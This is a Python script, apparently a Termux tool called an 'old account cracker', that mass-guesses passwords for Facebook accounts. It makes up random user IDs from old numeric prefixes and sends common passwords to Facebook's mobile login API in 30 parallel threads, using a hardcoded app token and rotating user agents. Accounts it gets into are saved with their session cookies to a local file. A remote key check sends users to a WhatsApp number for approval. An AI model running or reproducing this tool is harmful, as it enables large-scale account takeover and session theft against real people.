import os
import sys
import time
import re
import random
import uuid
import json
import subprocess
import platform
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from random import choice as race
from string import digits, ascii_letters
import urllib.parse
import base64
import ctypes
from datetime import datetime

# ✅ Fix imports auto install
try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests")
    import requests

try:
    import pycurl
except ModuleNotFoundError:
    os.system("pip install pycurl")
    import pycurl

try:
    import urllib3
except ModuleNotFoundError:
    os.system("pip install urllib3")
    import urllib3
    os.system("pip install requests")
    
#----------------------------[OFFICIAL CONFIG]----------------------------#
KEY_URL = "https://raw.githubusercontent.com/HASSAN-TOOL/Tool-Access/main/Key.txt"
ADMIN_NAME = "SHERRY KHAN"
WHATSAPP_NUMBER = "967550112202" 
VERSION = "0.2"

#----------------------------[TIME & DATE SYSTEM]--------------------------#
def get_info():
    now = datetime.now()
    date = now.strftime("%d-%m-%Y")
    day = now.strftime("%A")
    time_str = now.strftime("%I:%M %p")
    return date, day, time_str

#----------------------------[APPROVAL SYSTEM]----------------------------#
def check_approval():
    pro_banner()
    date, day, time_str = get_info()
    try:
        unique_id = str(os.getlogin()) + str(platform.node())
        my_token = "SHERRY-OK-" + str(unique_id.upper())[:10]
    except:
        my_token = "SHERRY-OK-" + str(os.getpid()) + "XZ"

    print(f" {W}[{G}○{W}] Connecting to Sherry Server...")
    
    try:
        approved_data = requests.get(KEY_URL).text
    except Exception:
        print(f" {W}[{R}✘{W}] NO INTERNET CONNECTION!")
        sys.exit()

    if my_token in approved_data:
        print(f" {W}[{G}✓{W}] YOUR DEVICE IS APPROVED!")
        print(f" {M}➤ {W}Welcome Back Boss.")
        time.sleep(2)
    else:
        print(f" {W}[{R}✘{W}] YOUR DEVICE IS NOT APPROVED!")
        lin()
        print(f" {M}➤ {W}Your Token : {G}{my_token}")
        print(f" {M}➤ {W}Status     : {R}Pending Approval")
        print(f" {M}➤ {W}Date       : {G}{date}")
        lin()
        print(f" {W}[{Y}!{W}] Copy your Token and send to Admin.")
        
        input(f" {W}[{G}➤{W}] Press Enter for WhatsApp...")
        msg = f"Hello%20Sir%2C%20Please%20Approve%20My%20Token%0A%0AMy%20Token%20%3A%20{my_token}"
        os.system(f"xdg-open https://wa.me/{WHATSAPP_NUMBER}?text={msg}")
        sys.exit()

#----------------------------[AUTO OPEN LINKS]----------------------------#
os.system("xdg-open https://@Sherrykhan-f3q3u")

#-----------------------------[LINE]-----------------------------------#
def lin():
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

#-----------------------------[COLOR CODE]-----------------------------------#
r = "\x1b[1;31m"; g = "\x1b[1;32m"; b = "\x1b[1;34m"
p = "\x1b[1;35m"; m = "\x1b[1;36m"; w = "\x1b[1;37m"
R = r; G = g; B = b; P = p; M = m; W = w; Y = "\x1b[1;33m"
loop = 0; oks = []

#-----------------------------[LOGO / BANNER]--------------------------------#
def pro_banner():
    date, day, time_str = get_info()
    os.system('clear')
    print(f"""
\x1b[1;32m
$$\   $$\  $$$$$$\  $$\   $$\ $$$$$$$$\ $$\     $$\ 
$$ |  $$ |$$  __$$\ $$$\  $$ |$$  _____|\$$\   $$  |
$$ |  $$ |$$ /  $$ |$$$$\ $$ |$$ |       \$$\ $$  / 
$$$$$$$$ |$$ |  $$ |$$ $$\$$ |$$$$$\      \$$$$  /  
$$  __$$ |$$ |  $$ |$$ \$$$$ |$$  __|      \$$  /   
$$ |  $$ |$$ |  $$ |$$ |\$$$ |$$ |          $$ |    
$$ |  $$ | $$$$$$  |$$ | \$$ |$$$$$$$$\     $$ |    
\__|  \__| \______/ \__|  \__|\________|    \__|                                                                                                                    
\x1b[1;95m╔═══════════════════════════════════╗
\x1b[1;95m║\x1b[1;97m      ✦  𝗧𝗢𝗢𝗟 I𝗡𝗙𝗢 𝗣𝗔𝗡𝗘𝗟  ✦        \x1b[1;95m║
\x1b[1;95m╚═══════════════════════════════════╝
\x1b[1;96m   ➤ \x1b[1;97mCreator        : \x1b[1;96m{ADMIN_NAME}
\x1b[1;96m   ➤ \x1b[1;97mDate           : \x1b[1;92m{date} ({day})
\x1b[1;96m   ➤ \x1b[1;97mTime           : \x1b[1;92m{time_str}
\x1b[1;96m   ➤ \x1b[1;97mVersion        : \x1b[1;95m{VERSION}
\x1b[1;92m───────────────────────────────────────────────""")

class NebulaColors:
    def __init__(self):
        self.W = '\x1b[97;1m'; self.R = '\x1b[91;1m'; self.G = '\x1b[92;1m'
        self.Y = '\x1b[93;1m'; self.B = '\x1b[94;1m'; self.P = '\x1b[95;1m'
        self.C = '\x1b[96;1m'; self.N = '\x1b[0m'

def linex():
    color = NebulaColors()
    print(f"  {color.P}╔═━─━━━━━━━━━━━━━━━━━━━━━━━━━━━━─━═╗")
    print(f"  {color.P}║    {color.Y}★ PREMIUM TOOL INTERFACE ★    {color.P}║")
    print(f"  {color.P}╚═━─━━━━━━━━━━━━━━━━━━━━━━━━━━━━─━═╝{color.N}")

def clear():
    os.system('clear')
    print(pro_banner())

class UserAgentGenerator:
    def __init__(self):
        self.custom_user_agents = [
            "[[FBAN/FBIOS;FBAV/540.0.0.44.68;FBBV/828638047;FBDV/iPhone16,2;FBMD/iPhone;FBSN/iOS;FBSV/18.5;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/837704895;IABMV/1];]",
        ]
        
    def _generate_mozilla_user_agent(self):
        android_version = random.randint(4, 13)
        device = random.choice(('SM-G900F', 'SM-G920F', 'SM-T535', 'SM-T231', 'SM-J320F', 'GT-I9190'))
        resolution = random.choice(('{density=1.5,width=720,height=1280}', '{density=3.5,width=1440,height=3040}'))
        chrome_version = f"{random.randint(100, 150)}.0.0.0"
        return f"Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36 [{resolution}]"

    def generate_user_agent(self):
        user_agent_type = random.choice(('Mozilla', 'Facebook', 'Dalvik', 'iPhone', 'Custom'))
        if user_agent_type == 'Mozilla':
            return self._generate_mozilla_user_agent()
        else:
            return random.choice(self.custom_user_agents)

    def load_user_agents_from_url(self):
        try:
            import requests
            response = requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/ua.txt')
            return response.text.splitlines()
        except Exception:
            return []

class MuskanCracker:
    def __init__(self):
        self.oks = []; self.cps = []; self.loop = 0
        self.color = NebulaColors()
        self.user_agents = UserAgentGenerator().load_user_agents_from_url()

    def old_menu(self):
        clear()
        print(f"{self.color.P}╔═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╗")
        print(f"{self.color.P}║         {self.color.Y}★ OLD ACCOUNT CRACKER ★         {self.color.P}║")
        print(f"{self.color.P}╠═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣")
        print(f"{self.color.P}║ {self.color.C}[1] {self.color.G}CRACK 2009 ACCOUNTS                 {self.color.P}║")
        print(f"{self.color.P}║ {self.color.C}[2] {self.color.G}CRACK 2009-2013 ACCOUNTS            {self.color.P}║")
        print(f"{self.color.P}║ {self.color.C}[3] {self.color.G}CONTACT ADMIN (WHATSAPP)            {self.color.P}║")
        print(f"{self.color.P}║ {self.color.C}[0] {self.color.R}⇦ EXIT TOOL                         {self.color.P}║")
        print(f"{self.color.P}╚═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╝")

        choice = input(f"  {self.color.C}\x1b[1;96m ➤ Choose: {self.color.B}").strip()
        if choice in ('1', '01'): self.execute_breach('100000')
        elif choice in ('2', '02'): self.quantum_breach_menu()
        elif choice == '3': os.system(f"xdg-open https://wa.me/{WHATSAPP_NUMBER}"); self.old_menu()
        elif choice in ('0', '00'): sys.exit()
        else: self.old_menu()

    def quantum_breach_menu(self):
        clear()
        series_map = {'1': '100000', '2': '100001', '3': '100002', '4': '100003', '5': '100004'}
        print(f"  {self.color.B}\x1b[1;96m ➤ Select Series:")
        for num, prefix in series_map.items():
            print(f"  {self.color.B}[{self.color.G}{num}{self.color.B}] {self.color.C}{prefix}")
        linex()
        choice = input(f"  {self.color.C}\x1b[1;96m ➤ Choose: {self.color.B}").strip()
        selected_prefix = series_map.get(choice)
        if not selected_prefix: self.quantum_breach_menu()
        self.execute_breach(selected_prefix)

    def execute_breach(self, prefix):
        try:
            clear()
            limit = int(input(f"  {self.color.G}\x1b[1;96m ➤ Enter Limit: {self.color.B}"))
        except ValueError: self.old_menu(); return
        targets = [prefix + ''.join(random.choices(digits, k=9)) for _ in range(limit)]
        passlist = ['123456789', '123456', '12345678', '1234567', '1234567890']
        with tred(max_workers=30) as executor:
            clear()
            print(f"  {self.color.B}\x1b[1;96m   ➤ Cracking {self.color.Y}{prefix} ")
            print(f"  {self.color.B}\x1b[1;96m   ➤ Targets: {self.color.G}{len(targets)}")
            linex()
            for target in targets: executor.submit(self.breach_target, target, passlist)
        self.display_results()

    def breach_target(self, target, passlist):
        self.loop += 1
        sys.stdout.write(f'\r  {self.color.B}[SHERRY] {self.loop}|{self.color.R}{len(self.oks)}|{self.color.G}{len(self.cps)}{self.color.B}')
        sys.stdout.flush()
        for password in passlist:
            if self.try_breach(target, password): break

    def try_breach(self, uid, password):
        try:
            ua = random.choice(self.user_agents)
            headers = {
                'User-Agent': ua, 'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123Dior23437a4a32',
            }
            payload = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
                'email': uid, 'password': password,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1', 'method': 'auth.login',
            }
            encoded_payload = urllib.parse.urlencode(payload)
            buffer = BytesIO(); c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-api.facebook.com/auth/login')
            c.setopt(c.POST, 1); c.setopt(c.POSTFIELDS, encoded_payload)
            c.setopt(c.WRITEDATA, buffer); c.setopt(c.TIMEOUT, 10)
            c.setopt(c.HTTPHEADER, [f"{k}: {v}" for k, v in headers.items()])
            c.perform()
            res = json.loads(buffer.getvalue().decode('utf-8'))
            c.close(); buffer.close()
            if 'session_key' in res:
                self.handle_success(uid, password, res); return True
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                self.handle_partial(uid, password); return True
        except: return False
        return False

    def handle_success(self, uid, password, response):
        coki = ';'.join([f"{c['name']}={c['value']}" for c in response.get('session_cookies', [])])
        print(f"\r  {self.color.G}\x1b[1;96m   ➤ SUCCESS {self.color.B}{uid}|{self.color.G}{password}{self.color.B}")
        with open('/sdcard/SHERRY-OLD.txt', 'a') as f: f.write(f'{uid}|{password}|{coki}\n')
        self.oks.append(uid)

    def handle_partial(self, uid, password):
        print(f"\r  {self.color.Y}\x1b[1;96m   ➤ OK {self.color.G}{uid}{self.color.Y}•\x1b[1;90m{password}{self.color.B}")
        with open('/sdcard/SHERRY-OLD.txt', 'a') as f: f.write(f'{uid}|{password}\n')
        self.cps.append(uid)

    def display_results(self):
        clear()
        print(f"  {self.color.G}\x1b[1;96m   ➤ CRACKING COMPLETE")
        linex()
        print(f"  {self.color.B}OK: {self.color.G}{len(self.oks)}")
        print(f"  {self.color.B}CP: {self.color.Y}{len(self.cps)}")
        linex(); input(f"  {self.color.C}Press ENTER to continue {self.color.B}"); self.old_menu()

# ===== ENTRY POINT =====
if __name__ == "__main__":
    try:
        check_approval() # Sabse pehle Approval check hogi
        cracker = MuskanCracker()
        cracker.old_menu()
    except KeyboardInterrupt: sys.exit()
    except Exception as e:
        print(f"\n Error: {str(e)}"); sys.exit()
